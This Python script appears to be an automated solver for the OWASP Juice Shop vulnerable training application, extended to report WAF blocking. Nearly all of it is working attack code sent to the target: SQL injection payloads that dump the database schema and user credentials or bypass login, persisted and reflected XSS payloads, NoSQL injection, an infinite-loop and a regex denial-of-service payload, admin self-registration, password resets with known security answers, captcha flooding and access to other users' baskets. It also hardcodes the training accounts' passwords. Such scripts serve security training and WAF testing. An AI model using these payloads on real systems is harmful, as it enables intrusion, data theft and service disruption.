#!/usr/bin/env python3

# Import all required modules at the top
import sys
import requests
from requests.exceptions import HTTPError, ContentDecodingError
from concurrent.futures import ThreadPoolExecutor
from json import loads
from typing import Optional, Dict, Any
from functools import wraps
import logging
import urllib3
import socket
from urllib.parse import urlparse
import re
from time import sleep

# Suppress insecure request warnings for test environment
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# Colors for console output
CRED = '\033[91m'
CGREEN = '\033[92m'
CEND = '\033[0m'

def is_valid_url_format(url: str) -> bool:
    """Check if the URL format is valid
    
    Args:
        url: The URL to validate
        
    Returns:
        bool: True if URL format is valid, False otherwise
    """
    url_pattern = re.compile(
        r'^https?://'
        r'(?:(?:[A-Z0-9](?:[A-Z0-9-]{0,61}[A-Z0-9])?\.)+[A-Z0-9]{2,63}(?:\.)?|'  # Max 63 chars per RFC 1035
        r'localhost|'
        r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})'
        r'(?::\d+)?'
        r'(?:/?|[/?]\S+)$', re.IGNORECASE)
    
    if not url_pattern.match(url):
        logger.error(f"{CRED}Invalid URL format: {url}{CEND}")
        return False
    return True

def check_dns_resolution(url: str) -> bool:
    """Check if the domain has valid DNS resolution
    
    Args:
        url: The URL to validate
        
    Returns:
        bool: True if domain resolves, False otherwise
    """
    try:
        parsed = urlparse(url)
        domain = parsed.netloc.split(':')[0]  # Remove port if present
        
        # Skip DNS check for localhost or IP addresses
        if domain == 'localhost' or re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$', domain):
            logger.info(f"DNS check skipped for {domain}")
            return True
            
        # Try getting all possible addresses
        try:
            addresses = socket.getaddrinfo(domain, None)
            if addresses:
                logger.info(f"{CGREEN}DNS resolution successful for {domain}{CEND}")
                return True
        except socket.gaierror as e:
            # log an exception to include stack trace for deeper debugging
            logger.exception("DNS lookup error for %s", url)
            return False
            
    except Exception as e:
        logger.exception("Unexpected error during DNS resolution for %s", url)
        return False

def validate_url(url: str, timeout: int = 5) -> bool:
    """Validate if the URL is reachable
    
    Args:
        url: The URL to validate
        timeout: Timeout in seconds for the request
        
    Returns:
        bool: True if URL is reachable, False otherwise
    """
    # First check URL format
    if not is_valid_url_format(url):
        return False
        
    # Then check DNS resolution
    if not check_dns_resolution(url):
        return False
        
    # Finally try connecting to the URL
    try:
        response = requests.get(
            url,
            timeout=timeout,
            verify=False,  # Allow self-signed certs for testing
            allow_redirects=True
        )
        response.raise_for_status()
        logger.info(f"{CGREEN}Successfully connected to {url}{CEND}")
        return True
    except requests.RequestException as e:
        # include traceback for the request error
        logger.exception("Error connecting to %s", url)
        return False

# Script header
print("Juice Shop Solver - Original code by Bryan Fauquembergue")
print("  - Enhanced to detect in line WAF blocking - by Vince Mammoliti, Oct 2024")
print("  - Added URL validation and error handling - Sept 30, 2025 & Feb 21, 2026")

def main() -> None:
    global url
    # Process command line arguments
    if len(sys.argv) == 1:
        sys.argv[1:] = ["http://juiceshop.local:80"]
    url = sys.argv[1]
    
    # Validate URL before proceeding
    if not validate_url(url):
        logger.error(f"{CRED}Exiting: Target URL %s is not reachable{CEND}", url)
        sys.exit(1)
    
    logger.info(f"\nCreating Traffic Against URL: {url}")


if __name__ == '__main__':
    try:
        main()
    except Exception:
        # catch everything at top level and log full traceback
        logger.exception("Unhandled exception in main")
        sys.exit(1)

# provide a small helper so the large list of challenge requests will at least
# report stack traces when they fail; use this as model for the rest of the
# file if you want more granular diagnostics.
def safe_request(desc, func, *args, **kwargs):
    """Wrapper for HTTP calls that logs tracebacks and handles
    occasional bad gzip encoding from the server.

    The original script would crash if the DNS lookup suddenly failed
    mid–run; the calls after "Login challenges" are plain ``requests``
    invocations.  Convert everything to use this helper and add an
    extra retry for name resolution errors so the tool remains
    robust in flaky network environments.

    If a ``ContentDecodingError`` occurs we retry once with
    ``Accept-Encoding: identity`` which avoids automatic decompression.
    """
    logger.info(desc)
    try:
        return func(*args, **kwargs)
    except ContentDecodingError as e:
        # server sent a gzip header but the body isn't gzipped; retry
        logger.warning("decoding failure for %s, retrying as identity: %s", desc, e)
        headers = kwargs.setdefault('headers', {})
        headers['Accept-Encoding'] = 'identity'
        try:
            return func(*args, **kwargs)
        except Exception:
            logger.exception("Retry also failed during %s", desc)
            return None
    except requests.exceptions.ConnectionError as e:
        # a DNS resolution or connection failure occurred; try one
        # more time after re‑validating the target URL.
        msg = str(e)
        if 'Failed to resolve' in msg or 'Name or service not known' in msg:
            logger.warning("DNS error during %s: %s, re‑checking and retrying", desc, e)
            if validate_url(url):
                try:
                    return func(*args, **kwargs)
                except Exception:
                    logger.exception("Retry also failed during %s", desc)
            else:
                logger.error("Cannot reach %s after DNS error, skipping", url)
        else:
            logger.exception("Connection error during %s", desc)
        return None
    except Exception:
        logger.exception("Exception during %s", desc)
        # propagate if necessary, or return None
        return None

 
# ==== No required action ====
with open('file-upload/Arbitrary File Write.zip','rb') as f:
    safe_request("Arbitrary File Write - Overwrite the Legal Information file.",
                 requests.post, url+'/file-upload', files={'file': f})
# ---- Access Log (Gain access to any access log file of the server.)
safe_request("Access Log", requests.get, url+'/support/logs/access.log')
# ---- Admin Registration (Register as a user with administrator privileges.)
safe_request("Admin Registration", requests.post,
             url+'/api/Users', data={'email':'admin','password':'admin','role':'admin'})
# ---- Admin Section (Access the administration section of the store.)
safe_request("Admin Section", requests.get, url+'/assets/public/images/padding/19px.png')
# ---- Blockchain Hype (Learn about the Token Sale before its official announcement.)
safe_request("Blockchain Hype", requests.get, url+'/assets/public/images/padding/56px.png')
# ---- Client-side XSS Protection (Perform a persisted XSS attack with <iframe src="javascript:alert(`xss`)"> bypassing a client-side security mechanism.)
safe_request("Client-side XSS Protection", requests.post,
             url+'/api/Users', data={'email':'<iframe src="javascript:alert(`xss`)">','password':'xss'})
# ---- Confidential Document (Access a confidential document.)
safe_request("Confidential Document", requests.get, url+'/ftp/acquisitions.md')
# ---- Database Schema (Exfiltrate the entire DB schema definition via SQL Injection.)
safe_request("Database Schema", requests.get,
             url+'/rest/products/search', params={'q':'qwert\')) UNION SELECT sql,\'2\',\'3\',\'4\',\'5\',\'6\',\'7\',\'8\',\'9\' FROM sqlite_master--'})
# ---- Deprecated Interface (Use a deprecated B2B interface that was not properly shut down.)
with open('file-upload/Deprecated Interface.xml','rb') as f:
    safe_request("Deprecated Interface", requests.post,
                 url+'/file-upload', files={'file': f})
# ---- Easter Egg (Find the hidden easter egg.)
safe_request("Easter Egg", requests.get, url+'/ftp/eastere.gg%2500.md')
# ---- Email Leak (Perform an unwanted information disclosure by accessing data cross-domain.)
requests.get(url+'/rest/user/whoami', params={'callback':''})
# ---- Error Handling (Provoke an error that is neither very gracefully nor consistently handled.)
requests.get(url+'/rest/qwertz')
# ---- Extra Language (Retrieve the language file that never made it into production.)
requests.get(url+'/assets/i18n/tlh_AA.json')
# ---- Forgotten Developer Backup (Access a developer's forgotten backup file.)
requests.get(url+'/ftp/package.json.bak%2500.md')
# ---- Forgotten Sales Backup (Access a salesman's forgotten backup file.)
requests.get(url+'/ftp/coupons_2013.md.bak%2500.md')
# ---- Imaginary Challenge (Solve challenge #999. Unfortunately, this challenge does not exist.)
requests.put(url+'/rest/continue-code/apply/69OxrZ8aJEgxONZyWoz1Dw4BvXmRGkM6Ae9M7k2rK63YpqQLPjnlb5V5LvDj')
# ---- Misplaced Signature File (Access a misplaced SIEM signature file.)
requests.get(url+'/ftp/suspicious_errors.yml%2500.md')
# ---- Missing Encoding (Retrieve the photo of Bjoern's cat in "melee combat-mode".)
requests.get(url+'/assets/public/images/uploads/😼-%23zatschi-%23whoneedsfourlegs-1572600969477.jpg')
# ---- Nested Easter Egg (Apply some advanced cryptanalysis to find the real easter egg.)
requests.get(url+'/the/devs/are/so/funny/they/hid/an/easter/egg/within/the/easter/egg')
# ---- NoSQL DoS (Let the server sleep for some time. (It has done more than enough hard work for you))
requests.get(url+'/rest/products/sleep(2000)/reviews')
# ---- NoSQL Exfiltration (All your orders are belong to us! Even the ones which don't.)
requests.get(url+'/rest/track-order/\'%20%7C%7C%20true%20%7C%7C%20\'')
# ---- Outdated Whitelist (Let us redirect you to one of our crypto currency addresses which are not promoted any longer.)
# Removed because lack of SSL libs
#requests.get(url+'/redirect?to=https://blockchain.info/address/1AbKfgvw9psQ41NbLi8kufDQTezwG8DRZm')
# ---- Premium Paywall ( Unlock Premium Challenge to access exclusive content.)
requests.get(url+'/this/page/is/hidden/behind/an/incredibly/high/paywall/that/could/only/be/unlocked/by/sending/1btc/to/us')
# ---- Privacy Policy (Read our privacy policy.)
requests.get(url+'/assets/public/images/padding/81px.png')
# ---- Privacy Policy Inspection (Prove that you actually read our privacy policy.)
requests.get(url+'/we/may/also/instruct/you/to/refuse/all/reasonably/necessary/responsibility')
# ---- Product Tampering (Change the href of the link within the OWASP SSL Advanced Forensic Tool (O-Saft) product description into https://owasp.slack.com.)
requests.put(url+'/api/Products/9', data={'description':'<a href="https://owasp.slack.com" target="_blank">More...</a>'})
# ---- Reflected XSS (Perform a reflected XSS attack with <iframe src="javascript:alert(`xss`)">.)
requests.get(url+'/rest/track-order/<iframe src="javascript:alert(`xss`)">')
# ---- Repetitive Registration (Follow the DRY principle while registering a user.)
requests.post(url+'/api/Users',data={'email':"aaaaaaa@juice-sh.op","password":"aaaaaaa","passwordRepeat":"aaaaaa","securityQuestion":{"id":6,"question":"Paternal grandmother's first name?","createdAt":"2020-01-16T14:58:58.420Z","updatedAt":"2020-01-16T14:58:58.420Z"},"securityAnswer":"aaaaaaa"})
# ---- Retrieve Blueprint (Deprive the shop of earnings by downloading the blueprint for one of its products.)
requests.get(url+'/assets/public/images/products/JuiceShop.stl')
# ---- Score Board (Find the carefully hidden 'Score Board' page.)
requests.get(url+'/assets/public/images/padding/1px.png')
# ---- Security Policy (Behave like any "white-hat" should before getting into the action.)
requests.get(url+'/.well-known/security.txt')
# ---- Upload Size (Upload a file larger than 100 kB.)
requests.post(url+'/file-upload', files={'file':open('file-upload/Upload Size.pdf','rb')})
# ---- Upload Type (Upload a file that has no .pdf or .zip extension.)
requests.post(url+'/file-upload', files={'file':open('file-upload/Upload Type.txt','rb')})
# ---- User Credentials (Retrieve a list of all user credentials via SQL Injection.)
requests.get(url+'/rest/products/search',params={'q':'qwert\')) UNION SELECT id, email, password, \'4\',\'5\',\'6\',\'7\',\'8\',\'9\' FROM Users--'})
# ---- Video XSS (Embed an XSS payload </script><script>alert(`xss`)</script> into our promo video.)
requests.post(url+'/file-upload', files={'file':open('file-upload/Video XSS.zip','rb')})
requests.get(url+'/promotion')
# ---- Whitelist Bypass (Enforce a redirect to a page you are not supposed to redirect to.)
# Removed as system does not have ssl libs
#requests.get(url+'/redirect?to=http://kimminich.de?pwned=https://github.com/bkimminich/juice-shop')

print("==== Login challenges ====")
# ---- Ephemeral Accountant (Log in with the (non-existing) accountant acc0unt4nt@juice-sh.op without ever registering that user.)
safe_request("Ephemeral Accountant", requests.post, url+'/rest/user/login',
             data={'email':'\' UNION SELECT * FROM (SELECT 15 as \'id\', \'\' as \'username\', \'acc0unt4nt@juice-sh.op\' as \'email\', \'12345\' as \'password\', \'accounting\' as \'role\', \'1.2.3.4\' as \'lastLoginIp\', \'default.svg\' as \'profileImage\', \'\' as \'totpSecret\', 1 as \'isActive\', \'1999-08-16 14:14:41.644 +00:00\' as \'createdAt\', \'1999-08-16 14:33:41.930 +00:00\' as \'updatedAt\', null as \'deletedAt\')--','password':'a'})
# ---- GDPR Data Erasure (Log in with Chris' erased user account.)
safe_request("GDPR Data Erasure", requests.post, url+'/rest/user/login',
             data={'email':'chris.pike@juice-sh.op\'--','password':'a'})
# ---- Leaked Access Logs (Dumpster dive the Internet for a leaked password and log in to the original user account it belongs to. (Creating a new account with the same password does not qualify as a solution.))
safe_request("Leaked Access Logs", requests.post, url+'/rest/user/login',
             data={'email':'J12934@juice-sh.op','password':'0Y8rMnww$*9VFYE§59-!Fg1L6t&6lB'})
# ---- Login Admin (Log in with the administrator's user account.)
safe_request("Login Admin", requests.post, url+'/rest/user/login',
             data={'email':'admin@juice-sh.op','password':'admin123'})
# ---- Login Amy (Log in with Amy's original user credentials. (This could take 93.83 billion trillion trillion centuries to brute force, but luckily she did not read the "One Important Final Note"))
safe_request("Login Amy", requests.post, url+'/rest/user/login',
             data={'email':'amy@juice-sh.op','password':'K1f.....................'})
# ---- Login Bender (Log in with Bender's user account.)
safe_request("Login Bender", requests.post, url+'/rest/user/login',
             data={'email':'bender@juice-sh.op\'--','password':'a'})
# ---- Login Bjoern (Log in with Bjoern's Gmail account without previously changing his password, applying SQL Injection, or hacking his Google account.)
safe_request("Login Bjoern", requests.post, url+'/rest/user/login',
             data={'email':'bjoern.kimminich@gmail.com','password':'bW9jLmxpYW1nQGhjaW5pbW1pay5ucmVvamI='})
# ---- Login Jim (Log in with Jim's user account.)
safe_request("Login Jim", requests.post, url+'/rest/user/login',
             data={'email':'jim@juice-sh.op','password':'ncc-1701'})
# ---- Login MC SafeSearch (Log in with MC SafeSearch's original user credentials without applying SQL Injection or any other bypass.)
safe_request("Login MC SafeSearch", requests.post, url+'/rest/user/login',
             data={'email':'mc.safesearch@juice-sh.op','password':'Mr. N00dles'})
# ---- Login Support Team (Log in with the support team's original user credentials without applying SQL Injection or any other bypass.)
safe_request("Login Support Team", requests.post, url+'/rest/user/login',
             data={'email':'support@juice-sh.op','password':'J6aVjTgOpRs$?5l+Zkq2AYnCE@RF§P'})
# ---- Password Strength (Log in with the administrator's user credentials without previously changing them or applying SQL Injection.)
# See "Login Admin" in this part

print("==== Change password challenges ====")
# ---- Bjoern's Favorite Pet (Reset the password of Bjoern's OWASP account via the Forgot Password mechanism with the original answer to his security question.)
safe_request("Bjoern's Favorite Pet", requests.post, url+'/rest/user/reset-password',
             data={'email':'bjoern@owasp.org','answer':'Zaya','new':'bjoern','repeat':'bjoern'})
print("Reset Bender's Password (Reset Bender's password via the Forgot Password mechanism with the original answer to his security question.)")
safe_request("Reset Bender's Password", requests.post, url+'/rest/user/reset-password',
             data={'email':'bender@juice-sh.op','answer':'Stop\'n\'Drop','new':'bender','repeat':'bender'})
# ---- Reset Bjoern's Password (Reset the password of Bjoern's internal account via the Forgot Password mechanism with the original answer to his security question.)
safe_request("Reset Bjoern's Password", requests.post, url+'/rest/user/reset-password',
             data={'email':'bjoern@juice-sh.op','answer':'West-2082','new':'bjoern','repeat':'bjoern'})
# ---- Reset Jim's Password (Reset Jim's password via the Forgot Password mechanism with the original answer to his security question.)
safe_request("Reset Jim's Password", requests.post, url+'/rest/user/reset-password',
             data={'email':'jim@juice-sh.op','answer':'Samuel','new':'jimjim','repeat':'jimjim'})
# ---- Reset Morty's Password (Reset Morty's password via the Forgot Password mechanism with his obfuscated answer to his security question.)
safe_request("Reset Morty's Password", requests.post, url+'/rest/user/reset-password',
             data={'email':'morty@juice-sh.op','answer':'5N0wb41L','new':'mortymorty','repeat':'mortymorty'})

# ==== Captcha ===
from json import loads
from time import sleep

def get_captcha(max_retries=3, retry_delay=1):
    """Get captcha with retries and error handling
    
    Args:
        max_retries: Maximum number of retry attempts
        retry_delay: Delay between retries in seconds
        
    Returns:
        dict: Captcha data if successful, None if failed
    """
    for attempt in range(max_retries):
        try:
            response = requests.get(url+'/rest/captcha')
            response.raise_for_status()
            captcha_data = loads(response.text)
            
            # Verify required fields exist
            if 'captchaId' not in captcha_data or 'answer' not in captcha_data:
                print(f"{CRED}Error: Invalid captcha response format{CEND}")
                if attempt < max_retries - 1:
                    sleep(retry_delay)
                    continue
                return None
                
            return captcha_data
            
        except (requests.RequestException, ValueError) as e:
#            print(f"{CRED}Error getting captcha (attempt {attempt + 1}/{max_retries}): {e}{CEND}")
            if attempt < max_retries - 1:
                sleep(retry_delay)
            else:
                return None

def submit_feedback(captcha_data, comment='a', max_retries=2):
    """Submit feedback with error handling
    
    Args:
        captcha_data: Dictionary containing captchaId and answer
        comment: Feedback comment
        max_retries: Maximum number of retry attempts
        
    Returns:
        bool: True if successful, False if failed
    """
    if not captcha_data:
        return False
        
    for attempt in range(max_retries):
        try:
            response = requests.post(
                url+'/api/Feedbacks',
                data={
                    'UserId': 1,
                    'captchaId': captcha_data['captchaId'],
                    'captcha': captcha_data['answer'],
                    'comment': comment,
                    'rating': 3
                }
            )
            response.raise_for_status()
            return True
        except Exception as e:
            if attempt == max_retries - 1:
                print(f'{CRED}>>> WAF Blocked <<<< {CEND} >>>> {e}')
#              print(f"{CRED}Error submitting feedback: {e}{CEND}")
    return False

print("---- Captcha Bypass (Submit 10 or more customer feedbacks within 10 seconds.")

# Get initial captcha
captcha_data = get_captcha()
if not captcha_data:
    print(f"{CRED}Failed to get captcha data, skipping captcha challenges{CEND}")
else:
    # Submit multiple feedbacks rapidly
    success_count = 0
    for i in range(11):
        if submit_feedback(captcha_data):
            success_count += 1
            
    if success_count >= 10:
        print(f"{CGREEN}Successfully completed Captcha Bypass Challenge ({success_count}/11){CEND}")
    else:
        print(f"{CRED}Failed Captcha Bypass Challenge (only {success_count}/11 successful){CEND}")
print("---- Executing remaining feedback challenges")

# Define feedback challenges
feedback_challenges = [
    ("Frontend Typosquatting", "ng2-bar-rating"),
    ("Leaked Unsafe Product", "Eurogium Edule Hueteroneel"),
    ("Legacy Typosquatting", "epilogue-js"),
    ("Server-side XSS Protection", "<<script>Foo</script>iframe src=\"javascript:alert(`xss`)\">"),
    ("Steganography", "Pickle Rick"),
    ("Supply Chain Attack", "https://github.com/eslint/eslint-scope/issues/39"),
    ("Vulnerable Library", "sanitize-html 1.4.2"),
    ("Weird Crypto", "z85")
]

# Get fresh captcha for remaining challenges
captcha_data = get_captcha()
if not captcha_data:
    print(f"{CRED}Failed to get captcha data, skipping remaining feedback challenges{CEND}")
else:
    # Execute each feedback challenge
    for challenge_name, comment in feedback_challenges:
        print(f"---- {challenge_name}")
        if submit_feedback(captcha_data, comment):
            print(f"{CGREEN}Successfully submitted feedback for {challenge_name}{CEND}")
        else:
            print(f"{CRED}Failed to submit feedback for {challenge_name}{CEND}")

# ==== Admin Authentication ===
def get_admin_token(max_retries=3, retry_delay=1):
    """Get authentication token for admin user with retries
    
    Args:
        max_retries: Maximum number of retry attempts
        retry_delay: Delay between retries in seconds
        
    Returns:
        dict: Authentication data if successful, None if failed
    """
    print("Attempting admin login...")
    
    for attempt in range(max_retries):
        try:
            response = requests.post(
                url+'/rest/user/login',
                data={'email': 'admin@juice-sh.op', 'password': 'admin123'}
            )
            response.raise_for_status()
            
            data = loads(response.text)
            if 'authentication' not in data:
                print(f"{CRED}Error: No authentication token in response (attempt {attempt + 1}/{max_retries}){CEND}")
                if attempt < max_retries - 1:
                    sleep(retry_delay)
                    continue
                return None
                
            print(f"{CGREEN}Admin login successful{CEND}")
            return data['authentication']
            
        except requests.RequestException as e:
            print(f"{CRED}Error during login request (attempt {attempt + 1}/{max_retries}): {e}{CEND}")
            if attempt < max_retries - 1:
                sleep(retry_delay)
            else:
                return None
        except ValueError as e:
            print(f"{CRED}Error parsing login response (attempt {attempt + 1}/{max_retries}): {e}{CEND}")
            if attempt < max_retries - 1:
                sleep(retry_delay)
            else:
                return None

# Get admin authentication token
login = get_admin_token()
if not login:
    print(f"{CRED}Failed to obtain admin authentication token. Exiting.{CEND}")
    sys.exit(1)

def execute_authenticated_request(endpoint: str, method: str = 'GET', description: str = None, **kwargs) -> Optional[requests.Response]:
    """Execute an authenticated request with error handling
    
    Args:
        endpoint: The API endpoint to call
        method: HTTP method to use
        description: Description of the operation for logging
        **kwargs: Additional arguments for requests
        
    Returns:
        Optional[Response]: Response if successful, None if failed
    """
    if not login or 'token' not in login:
        print(f"{CRED}No valid authentication token available{CEND}")
        return None
        
    kwargs['headers'] = kwargs.get('headers', {})
    kwargs['headers']['Authorization'] = f"Bearer {login['token']}"
    
    try:
        if description:
            print(f"Executing: {description}")
            
        response = requests.request(method, url + endpoint, **kwargs)
        response.raise_for_status()
        
        if description:
            print(f"{CGREEN}Success: {description}{CEND}")
        return response
        
    except requests.RequestException as e:
        if description:
            print(f"{CRED}>>> WAF Blocked <<<< {description}: {e}{CEND}")
        return None
print("\n==== Authenticated Challenges ====")

# API-only XSS Challenge
print("\n---- API-only XSS Challenge")
execute_authenticated_request(
    '/api/Products',
    'POST',
    "API-only XSS Challenge",
    data={
        'name': 'XSS',
        'description': '<iframe src="javascript:alert(`xss`)">',
        'price': 47.11
    }
)

# Blocked RCE DoS Challenge
print("\n---- Blocked RCE DoS Challenge")
execute_authenticated_request(
    '/b2b/v2/orders',
    'POST',
    "Blocked RCE DoS Challenge",
    data={'orderLinesData': '(function dos() { while(true); })()'}
)

# Change Bender's Password Challenge (Change Bender's password into slurmCl4ssic without using SQL Injection or Forgot Password.)
try:
    response = requests.get(url+'/rest/user/change-password', params={'new':'slurmCl4ssic','repeat':'slurmCl4ssic'}, headers={'Authorization':'Bearer '+(loads(requests.post(url+'/rest/user/login',data={'email':'bender@juice-sh.op\';--','password':'a'}).text)['authentication']['token'])})
    response.raise_for_status()
    jsonResponse = response.json()
except HTTPError as http_err:
        print(f'HTTP error occurred: {http_err}')
except Exception as err:
        print(f'{CRED}>>> WAF Blocked <<<< {CEND} >>>> {err}')
print("---- GDPR Data Theft (Steal someone else's personal data without using Injection.)") 
requests.post(url+'/api/Users',data={'email':'edmin@juice-sh.op','password':'edmin123','role':'admin'})
requests.post(url+'/rest/user/data-export',data={'format':'1'},headers={'Authorization':'Bearer '+(loads(requests.post(url+'/rest/user/login',data={'email':'edmin@juice-sh.op','password':'edmin123'}).text)['authentication']['token'])})
# HTTP-Header XSS Challenge
print("\n---- HTTP-Header XSS Challenge")
execute_authenticated_request(
    '/rest/saveLoginIp',
    'GET',
    "HTTP-Header XSS Challenge",
    headers={'True-Client-IP': '<iframe src="javascript:alert(`xss`)">'}
)

# Multiple Likes Challenge
print("\n---- Multiple Likes Challenge")

def execute_multiple_likes():
    try:
        # First ensure we have a valid admin token
        if not login or 'token' not in login:
            print(f"{CRED}Error: No valid admin token available{CEND}")
            return
            
        # Get product review ID
        print("Fetching product reviews...")
        review_response = requests.get(
            url + '/rest/products/1/reviews',  # Try product ID 1 instead of 3
            headers={'Authorization': f"Bearer {login['token']}"}
        )
        review_response.raise_for_status()
        review_data = loads(review_response.text)
        
        if not review_data.get('data') or not review_data['data']:
            print(f"{CRED}Error: No review data found{CEND}")
            return
            
        product_id = review_data['data'][0]['_id']
        print(f"Found review with ID: {product_id}")
        
        # Submit multiple likes sequentially first to ensure it works
        print("Attempting likes...")
        success_count = 0
        
        for i in range(4):
            try:
                response = requests.post(
                    url + '/rest/products/reviews',
                    headers={'Authorization': f"Bearer {login['token']}"},
                    data={'id': product_id}
                )
                response.raise_for_status()
                success_count += 1
                print(f"Like {i+1} successful")
                sleep(0.1)  # Small delay between requests
            except requests.RequestException as e:
                print(f"", end='')  # Suppress error output for individual likes 

#              print(f"{CRED}Error on like {i+1}: {e}{CEND}")      # Removed to show clarity of WAF blocking
        
        if success_count >= 3:
            print(f"{CGREEN}Successfully completed Multiple Likes Challenge ({success_count}/4){CEND}")
        else:
            print(f"", end='')  # Suppress error output for individual likes 
#            print(f"{CRED}Failed Multiple Likes Challenge (only {success_count}/4 successful){CEND}")
                
    except requests.RequestException as e:
        print(f"{CRED}Error in Multiple Likes Challenge: {e}{CEND}")
    except KeyError as e:
        print(f"{CRED}Error accessing review data: {e}{CEND}")
    except Exception as e:
        print(f"{CRED}Unexpected error: {e}{CEND}")

# Execute the multiple likes challenge
execute_multiple_likes()
# Successful RCE DoS Challenge
print("\n---- Successful RCE DoS Challenge")
execute_authenticated_request(
    '/b2b/v2/orders',
    'POST',
    "RCE DoS Challenge",
    data={'orderLinesData': '/((a+)+)b/.test(\'aaaaaaaaaaaaaaaaaaaaaaaaaaaaa\')'}
)

# View Basket Challenge
print("\n---- View Basket Challenge")
if 'bid' in login:
    execute_authenticated_request(
        f"/rest/basket/{login['bid'] + 1}",
        'GET',
        "View Basket Challenge"
    )
else:
    print(f"{CRED}Error: No basket ID available in login data{CEND}")
